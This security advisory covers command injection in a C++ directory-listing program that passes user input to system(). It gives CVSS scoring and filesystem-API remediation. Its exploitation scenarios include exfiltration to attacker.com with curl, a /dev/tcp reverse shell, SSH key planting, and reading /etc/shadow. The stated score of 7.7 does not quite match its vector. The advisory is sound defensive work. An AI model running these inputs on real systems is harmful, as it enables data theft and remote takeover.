# Command Injection in File Management Application

# Vulnerability Case
During the assessment of Acme Corp's C++ based logistics application running on Ubuntu 20.04 with GCC 9.3, we identified a command injection vulnerability in the file management module. The application concatenates untrusted user input directly into an OS command executed via the standard C library's `system()` function, permitting an attacker to inject arbitrary shell commands through specially crafted file paths. Our discovery occurred during a source code review, where we noted that file paths received as input were not properly validated or sanitized. Exploitation of this flaw could allow an attacker to execute arbitrary OS commands, potentially leading to privilege escalation, data exfiltration, and complete system compromise. Given the critical role of this module in Acme Corp's operations, the security implications are significant.

```cpp
#include <iostream>
#include <cstdlib>
#include <string>

int main() {
std::string filePath;
std::cout << "Enter a directory path: ";
std::getline(std::cin, filePath);

// Vulnerable: Concatenates untrusted input directly into the OS command
std::string cmd = "ls " + filePath;
system(cmd.c_str()); // Potential command injection point

return 0;
}
```

An attacker can exploit this vulnerability by injecting shell metacharacters (e.g., `;`, `&&`, or backticks) into the input parameter. For instance, in the `filePath` field, the input could be manipulated to terminate the intended command and execute additional OS commands. This vulnerability permits abuse of the system call, potentially leading to remote code execution, unauthorized access, or privilege escalation. The impact on business operations includes the risk of complete node compromise, lateral movement within the network infrastructure, and data breaches that could severely disrupt the continuity of services.


context: cpp.lang.security.system-command.command-injection-path.command-injection-path Untrusted input might be injected into a command executed by the application, which can lead to a command injection vulnerability. An attacker can execute arbitrary commands, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing OS commands with user input. If this is unavoidable, validate and sanitize the input, and use safe methods for executing the commands.

# Vulnerability Breakdown
This vulnerability involves the direct concatenation of untrusted user input into shell commands without any validation or sanitization, allowing arbitrary command execution.

1. **Key vulnerability elements**:
   - Direct concatenation of user input into OS command string
   - Use of `system()` function to execute commands
   - No input validation or sanitization
   - No shell metacharacter escaping

2. **Potential attack vectors**:
   - Injection of shell metacharacters (`;`, `&&`, `||`, `|`, backticks)
   - Command chaining to execute arbitrary commands
   - Data exfiltration through command redirection
   - Privilege escalation if application runs with elevated permissions

3. **Severity assessment**:
   - Local attack vector requiring application access
   - Low complexity exploitation requiring basic skills
   - Low privileges required to interact with the application
   - High impact across confidentiality, integrity, and availability
   - Potentially complete system compromise within user's privilege level

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Local (L) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): Low (L) 
   - User Interaction (UI): None (N) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): High (H) 
   - Integrity (I): High (H) 
   - Availability (A): High (H) 

# Description
A command injection vulnerability exists in Acme Corp's C++ based logistics application running on Ubuntu 20.04. The vulnerability is located in the file management module, where the application directly concatenates untrusted user input into a command string executed via the standard C library's `system()` function without any validation or sanitization.

```cpp
#include <iostream>
#include <cstdlib>
#include <string>

int main() {
std::string filePath;
std::cout << "Enter a directory path: ";
std::getline(std::cin, filePath);

// Vulnerable: Concatenates untrusted input directly into the OS command
std::string cmd = "ls " + filePath;
system(cmd.c_str()); // Potential command injection point

return 0;
}

```

This vulnerability allows attackers to inject shell metacharacters (such as `;`, `&&`, or backticks) to terminate the intended command and execute additional arbitrary OS commands with the privileges of the application process. Given the critical role of this module in Acme Corp's operations, successful exploitation could lead to system compromise, data exfiltration, and severe operational disruption.

# CVSS
**Score**: 7.7 \
**Vector**: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H \
**Severity**: High

The High severity rating is based on the following factors:

- **Attack Vector (Local)**: The vulnerability requires local access to the system where the application is running, as the attacker must be able to provide input to the application.

- **Attack Complexity (Low)**: Exploiting this vulnerability is straightforward and doesn't require special conditions or timing. An attacker simply needs to input shell metacharacters to execute arbitrary commands.

- **Privileges Required (Low)**: The attacker needs basic user privileges to run the application and provide input.

- **User Interaction (None)**: No additional user interaction is required once the attacker has access to the application.

- **Scope (Unchanged)**: The vulnerability affects resources managed by the same security authority. The commands execute with the same privileges as the application process.

- **Confidentiality Impact (High)**: An attacker can access sensitive files and data accessible to the process running the application.

- **Integrity Impact (High)**: An attacker can modify files and data accessible to the process running the application.

- **Availability Impact (High)**: An attacker can execute commands that could crash the system, delete critical files, or otherwise impact system availability.

The combined impact and exploitability metrics result in a CVSS score of 7.7, which corresponds to a High severity rating.

# Exploitation Scenarios
**Scenario 1: Data Exfiltration**
An attacker inputs the following when prompted for a directory path:
`/tmp; cat /etc/passwd | curl -d @- https://attacker.com/collect`

This causes the application to:
1. Execute `ls /tmp` (the intended command)
2. Execute `cat /etc/passwd` to read system user information
3. Pipe this data to curl, which sends it to the attacker's server

This scenario allows the attacker to steal sensitive system information without leaving obvious traces.

**Scenario 2: Malicious File Creation**
An attacker inputs:
`/tmp; echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh`

This creates an executable backdoor script that, when run, will establish a reverse shell to the attacker's system. The attacker could then schedule this script to run using cron or trick legitimate users into executing it.

**Scenario 3: Application Compromise**
An attacker inputs:
`/tmp; sed -i 's/password_check()/return true;/' /opt/acme/auth.cpp && make -C /opt/acme`

This modifies the source code of the application's authentication module to bypass password checks and recompiles it. When the application restarts, the attacker can access it without valid credentials.

**Scenario 4: Lateral Movement**
An attacker inputs:
`/tmp; ssh-keygen -t rsa -f /tmp/key -N ""; cat /tmp/key.pub >> ~/.ssh/authorized_keys`

This generates an SSH key pair and adds the public key to the authorized keys file, allowing the attacker to establish SSH sessions to the compromised user's account without a password, facilitating lateral movement within the network.

# Impact Analysis
**Business Impact:**
- Unauthorized access to sensitive corporate and customer data potentially leading to privacy breaches
- Disruption of logistics operations that rely on the application, causing business continuity issues
- Potential for complete system compromise leading to extended service outages
- Regulatory compliance violations resulting in potential fines and legal consequences
- Reputational damage affecting customer trust and business relationships
- Financial losses from breach remediation, system recovery, and potential liability claims
- Intellectual property theft if proprietary logistics algorithms or business data are exposed

**Technical Impact:**
- Execution of arbitrary code with the same privileges as the application process
- Access to all system resources available to the application including configuration files and credentials
- Ability to read, modify, or delete sensitive data on the affected system
- Potential for credential theft enabling access to other systems and services
- Installation of persistent backdoors allowing continued access even after the initial vulnerability is patched
- Lateral movement to other systems within the network infrastructure
- Potential for privilege escalation if the application runs with elevated permissions or if local privilege escalation vulnerabilities exist
- Compromise of logging and monitoring systems to hide evidence of intrusion

# Technical Details
The vulnerability exists in the file management module of Acme Corp's logistics application. The root cause is the direct concatenation of unsanitized user input into a command string that is executed using the `system()` function.

```cpp
// Vulnerable code pattern
std::string filePath;
std::getline(std::cin, filePath);
std::string cmd = "ls " + filePath;
system(cmd.c_str());

```

This vulnerability is particularly dangerous for several reasons:

1. **Unconstrained Command Execution**: The `system()` function passes its argument to the command processor (shell), which interprets special characters like semicolons (`;`), pipes (`|`), ampersands (`&`), and backticks (`` ` ``). This allows attackers to chain multiple commands.

2. **Process Privilege Level**: The injected commands execute with the same permissions as the application process. If the application runs with elevated privileges or as a service, the impact is significantly increased.

3. **No Input Validation**: The code lacks any validation of the user input, such as checking for shell metacharacters or verifying that the input conforms to an expected pattern for directory paths.

4. **No Shell Escaping**: The code doesn't escape special characters in the user input that might have special meaning to the shell.

The exploitation process works as follows:

1. The application prompts for a directory path
2. The attacker provides a path followed by shell metacharacters and additional commands
3. The application constructs a command string containing the attacker's input
4. The `system()` function passes this string to the shell
5. The shell interprets the metacharacters and executes both the intended command and the attacker's injected commands

For example, if the attacker inputs:
`/tmp; cat /etc/shadow > /tmp/passwords`

The resulting command passed to `system()` would be:
`ls /tmp; cat /etc/shadow > /tmp/passwords`

This would list the contents of /tmp AND extract password hashes from the shadow file to a location the attacker can access.

# Remediation Steps
## Replace system() with Filesystem API

**Priority**: P0

The most effective remediation is to completely avoid using shell commands and instead use the C++ filesystem API for directory operations:

```cpp
#include <iostream>
#include <filesystem>
#include <string>

int main() {
    std::string dirPath;
    std::cout << "Enter a directory path: ";
    std::getline(std::cin, dirPath);
    
    try {
        // Use std::filesystem instead of system() calls
        std::filesystem::path path(dirPath);
        
        // Validate the path exists and is a directory
        if (!std::filesystem::exists(path)) {
            std::cerr << "Error: Path does not exist" << std::endl;
            return 1;
        }
        
        if (!std::filesystem::is_directory(path)) {
            std::cerr << "Error: Path is not a directory" << std::endl;
            return 1;
        }
        
        // List directory contents using filesystem API
        std::cout << "Directory contents:" << std::endl;
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            std::cout << entry.path().filename().string() << std::endl;
        }
    }
    catch (const std::filesystem::filesystem_error& e) {
        std::cerr << "Filesystem error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}

```

This approach completely eliminates the command injection vulnerability by using the C++ filesystem API to perform the directory listing operation without invoking a shell. It also adds proper error handling for invalid paths.
## Input Validation and Shell Escaping

**Priority**: P1

If using the system() function cannot be avoided for some operational reason, implement strict input validation and proper shell escaping:

```cpp
#include <iostream>
#include <cstdlib>
#include <string>
#include <regex>

// Function to validate and sanitize directory path input
bool isValidPath(const std::string& path) {
    // Only allow alphanumeric characters, underscores, hyphens, periods, and forward slashes
    std::regex validPathPattern("^[a-zA-Z0-9_\-\./]+$");
    return std::regex_match(path, validPathPattern);
}

// Function to escape shell metacharacters
std::string escapeShellArg(const std::string& arg) {
    std::string result;
    result.reserve(arg.size() * 2); // Reserve space for worst case
    
    result.push_back('"'); // Starting quote
    
    for (char c : arg) {
        if (c == '"' || c == '\\' || c == '$' || c == '`') {
            result.push_back('\\'); // Escape special chars
        }
        result.push_back(c);
    }
    
    result.push_back('"'); // Ending quote
    return result;
}

int main() {
    std::string dirPath;
    std::cout << "Enter a directory path: ";
    std::getline(std::cin, dirPath);
    
    // Validate input
    if (!isValidPath(dirPath)) {
        std::cerr << "Invalid directory path. Only alphanumeric characters, underscores, "
                  << "hyphens, periods, and forward slashes are allowed." << std::endl;
        return 1;
    }
    
    // Escape shell arguments and construct command
    std::string escapedPath = escapeShellArg(dirPath);
    std::string cmd = "ls " + escapedPath;
    
    // Execute command
    system(cmd.c_str());
    
    return 0;
}

```

This approach uses two layers of protection:

1. Input validation using a regular expression to ensure the path only contains allowed characters
2. Shell argument escaping to neutralize any potentially harmful characters

This approach significantly reduces the risk of command injection, but using the filesystem API (as in the P0 remediation) is still the preferred solution.


# References
* CWE-78 | [Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
* CWE-77 | [Improper Neutralization of Special Elements used in a Command ('Command Injection')](https://cwe.mitre.org/data/definitions/77.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* A04:2021 | [Insecure Design](https://owasp.org/Top10/A04_2021-Insecure_Design/)
